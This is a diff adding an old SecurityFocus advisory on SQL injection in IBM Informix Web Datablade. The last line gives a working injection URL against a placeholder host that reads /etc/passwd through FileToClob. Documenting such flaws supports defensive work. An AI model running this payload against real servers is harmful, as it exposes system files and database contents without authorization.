@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/4496/info
+
+Informix is an enterprise database distributed and maintained by IBM. The Web Datablade Module for Informix SQL, dynamically generates HTML content based on Database data. Web Datablade is available for Apache, IIS, and Netscape web servers, and a generic CGI version is provided for alternative servers. It will execute under Windows NT, Linux and many Unix-like systems.
+
+A vulnerability has been reported in some versions of Web Datablade. Reportedly, it is possible to inject SQL commands into any page request processed by Web Datablade. This may result in the disclosure of sensitive information or increased access to the database.
+
+There have been reports that a similar issue exists within the HTTP Basic Authentication process used by Web Datablade, which also submits queries to the database. However, detailed exploitation information is not available for this case.
+
+http://victim.com/site/' UNION ALL SELECT FileToClob('/etc/passwd','server')::html,0 FROM sysusers WHERE username = USER --/.html 
